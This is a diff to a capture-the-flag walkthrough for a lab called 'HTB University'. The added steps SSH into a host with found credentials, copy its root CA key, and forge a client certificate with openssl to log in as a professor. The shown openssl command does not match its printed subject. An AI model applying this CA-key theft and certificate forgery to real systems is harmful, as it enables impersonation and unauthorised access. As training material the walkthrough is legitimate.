@@ -664,7 +664,6 @@ Attempt to ssh using `wao` credentials worked
 
 ```console
 root@kali:~# proxychains -q ssh wao@192.168.99.12
-Warning: Permanently added '192.168.99.12' (ED25519) to the list of known hosts.
 --------------------------[!]WARNING[!]-----------------------------
 |This LAB is created for web app features testing purposes ONLY....|
 |Please DO NOT leave any critical information while this machine is|
@@ -695,7 +694,7 @@ User wao may run the following commands on LAB-2:
     (ALL : ALL) ALL
 ```
 
-The `Downloads` directory in `wao`'s home directory appears to be the developer work area for the site, `rootCA.key` is found in this directory too:
+The `Downloads` directory in `wao`'s home directory looks like the developer work area for the university site, `rootCA.key` is found in this directory too:
 
 ```console
 wao@LAB-2:~$ ls -lRa
@@ -739,23 +738,64 @@ drwxrwxr-x 9 wao wao 4096 Sep 14 03:55 ..
 -rwxrwxr-x 1 wao wao 1704 Sep 14 03:55 rootCA.key
 -rwxrwxr-x 1 wao wao   42 Sep 14 03:55 rootCA.srl
 ⋮
-
-./Downloads/University-Prototype-23:
-total 224
-drwxrwxr-x 5 wao wao   4096 Sep 14 03:55 .
-drwxrwxr-x 9 wao wao   4096 Sep 14 03:55 ..
-drwxrwxr-x 2 wao wao   4096 Sep 14 03:55 CA
--rwxrwxr-x 1 wao wao 200704 Sep 14 03:55 db.sqlite3
--rwxrwxr-x 1 wao wao    666 Sep 14 03:55 manage.py
--rwxrwxr-x 1 wao wao    133 Sep 14 03:55 start-server.bat
-drwxrwxr-x 4 wao wao   4096 Sep 14 03:55 static
-drwxrwxr-x 5 wao wao   4096 Sep 14 03:55 University
-
-./Downloads/University-Prototype-23/CA:
-total 20
-drwxrwxr-x 2 wao wao 4096 Sep 14 03:55 .
-drwxrwxr-x 5 wao wao 4096 Sep 14 03:55 ..
--rwxrwxr-x 1 wao wao 1399 Sep 14 03:55 rootCA.crt
--rwxrwxr-x 1 wao wao 1704 Sep 14 03:55 rootCA.key
--rwxrwxr-x 1 wao wao   42 Sep 14 03:55 rootCA.srl
 ```
+
+## 5. Getting access to the university site
+
+What is found so far:
+- The university site accepts certificate-based authentication
+- The list of existing professor accounts are found in the sqlite3 database
+- The root CA certificate and key were found in `192.168.99.12`
+
+→ Let's attempt to generate a certificate for one of the users
+
+Transfer the root CA certificate and key over to Kali
+
+```console
+root@kali:~# proxychains -q scp wao@192.168.99.12:~/Downloads/CA/rootCA.crt .
+--------------------------[!]WARNING[!]-----------------------------
+|This LAB is created for web app features testing purposes ONLY....|
+|Please DO NOT leave any critical information while this machine is|
+|       accessible by all the "Web Developers" as sudo users       |
+--------------------------------------------------------------------
+wao@192.168.99.12's password:
+rootCA.crt                                                                100% 1399   110.4KB/s   00:00
+
+root@kali:~# proxychains -q scp wao@192.168.99.12:~/Downloads/CA/rootCA.key .
+--------------------------[!]WARNING[!]-----------------------------
+|This LAB is created for web app features testing purposes ONLY....|
+|Please DO NOT leave any critical information while this machine is|
+|       accessible by all the "Web Developers" as sudo users       |
+--------------------------------------------------------------------
+wao@192.168.99.12's password:
+rootCA.key                                                                100% 1704   144.9KB/s   00:00
+```
+
+Generate user key and certificate using the email and name of a user found in the sqlite3 database as certificate subject:
+
+```console
+root@kali:~# openssl genpkey -algorithm ec -pkeyopt ec_paramgen_curve:P-384 -out george.key
+
+root@kali:~# openssl req -new -key george.key -subj "/O=HTB University/CN=Any Name" -out george.csr
+
+root@kali:~# openssl x509 -req -in george.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -days 3650 -sha256 -out george.pem
+Certificate request self-signature ok
+subject=emailAddress=george@university.htb, CN=george
+```
+
+Login to the university site with the certificate:
+
+![image](https://github.com/user-attachments/assets/6941e7d2-af15-4ee3-898d-46d98ce580c3)
+
+The access of a professor has 3 more functions in the dashboard:
+- Create a New course
+- Manage My Courses
+- Change Public Key
+
+![image](https://github.com/user-attachments/assets/f714bb04-734c-46c2-b18b-4f8e825baab1)
+
+GPG is used to encrypt uploaded lectures and there's a hint suggesting that uploading a file may be interesting
+
+> Please note that providing an invalid gpg file will prevent us from verifying the uploaded lectures in the feature and will cause errors...
+
+![image](https://github.com/user-attachments/assets/962a9aec-7153-4e6b-9990-f148aa242cd1)
